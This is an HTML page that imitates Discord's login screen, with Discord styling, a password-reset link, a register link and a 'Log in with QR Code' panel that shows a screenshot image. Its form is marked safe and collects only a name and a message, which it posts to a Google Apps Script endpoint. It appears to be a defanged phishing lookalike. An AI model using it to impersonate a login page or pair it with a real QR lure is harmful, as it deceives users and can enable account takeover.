<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Demo — Login-like UI (Safe)</title>
  <style>
    /* Aapka original style reuse kiya gaya */
    body {
      margin: 0;
      font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-image: url('dc backgrouund with name.png');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      overflow: hidden;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      display: flex;
      background-color: #313338;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      overflow: hidden;
      width: 700px;
      max-width: 90%;
    }
    .left, .right {
      flex: 1;
      padding: 30px;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    h2 { margin-bottom: 8px; font-size: 20px; font-weight: 600; }
    p { margin-bottom: 25px; font-size: 14px; color: #b9bbbe; }
    label { display: block; margin-bottom: 5px; font-size: 13px; font-weight: 500; color: #ffffff; text-align: left; width: 100%; }
    .required { color: red; font-size: 12px; margin-left: 2px; }
    input, textarea {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      background-color: #1e1f22;
      border: none;
      border-radius: 4px;
      color: #f2f3f5;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
    }
    textarea { resize: vertical; min-height: 80px; }
    .forgot { text-align: left; margin-bottom: 15px; font-size: 12px; padding-left: 2px; width: 100%; }
    button {
      width: 100%;
      padding: 10px;
      background-color: #5865F2;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 10px;
    }
    .register { text-align: center; font-size: 13px; margin-top: auto; }
    .register span { color: #b9bbbe; }
    .register a { color: #7289DA; text-decoration: none; margin-left: 4px; }
    .qr-wrapper { width: 140px; height: 140px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; }
    .qr-wrapper img.qr { width: 100%; height: 100%; object-fit: contain; background: white; padding: 6px; border-radius: 4px; box-shadow: 0 0 8px rgba(0,0,0,0.2); }
    .right h3 { margin-bottom: 8px; font-size: 16px; font-weight: 600; color: white; }
    .right p { font-size: 13px; color: #b9bbbe; max-width: 200px; margin-bottom: 20px; }
    .passkey { font-size: 13px; color: #7289DA; cursor: pointer; }
    @media (max-width: 768px) { .container { flex-direction: column; } }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <h2>Welcome back!</h2>
      <p>We're so excited to see you again!</p>

      <!-- SAFE FORM: Name + Message (non-sensitive) -->
      <form id="safeForm">
        <label for="name">Name <span class="required">*</span></label>
        <input type="text" id="name" name="name" placeholder="Apna naam likho" required />

        <label for="message">Message <span class="required">*</span></label>
        <textarea id="message" name="message" placeholder="Kuch likho..." required></textarea>

        <div class="forgot">
          <a href="#">Forgot your password?</a>
        </div>

        <button type="submit">Send</button>
      </form>

      <div class="register">
        <span>Need an account?</span><a href="https://canary.discord.com/register" target="_blank" rel="noopener">Register</a>
      </div>
    </div>

    <div class="right">
      <div class="qr-wrapper">
        <img src="Screenshot (270).png" alt="QR Code" class="qr" />
      </div>
      <h3>Log in with QR Code</h3>
      <p>Scan this with your mobile app to log in instantly.</p>
      <div class="passkey">Log in with another password</div>
    </div>
  </div>

  <script>
    // === Replace with your own deployed Apps Script Web App URL after you deploy Code.gs ===
    const SCRIPT_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxmKnWy1qYWRAfoC1-b8DV499BYnZJ4jwe31n066KU0i8N2kxeEsyv5IdjpoHGGAo7X/exec";

    const form = document.getElementById('safeForm');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const name = document.getElementById('name').value.trim();
      const message = document.getElementById('message').value.trim();
      const btn = form.querySelector('button[type="submit"]');

      if (!name || !message) {
        alert('Donon fields bharen');
        return;
      }

      btn.disabled = true;
      btn.textContent = 'Sending...';

      fetch(SCRIPT_WEB_APP_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: name, message: message })
      })
      .then(response => response.json().catch(()=>({})))
      .then(data => {
        btn.disabled = false;
        btn.textContent = 'Send';
        if (data && data.result === 'success') {
          alert('Saved to Google Sheet ✅');
          form.reset();
        } else {
          alert('Server error: ' + (data.message || 'Unknown'));
          console.error('Server response:', data);
        }
      })
      .catch(err => {
        btn.disabled = false;
        btn.textContent = 'Send';
        alert('Network error. Console check karo.');
        console.error(err);
      });
    });
  </script>
</body>
</html>
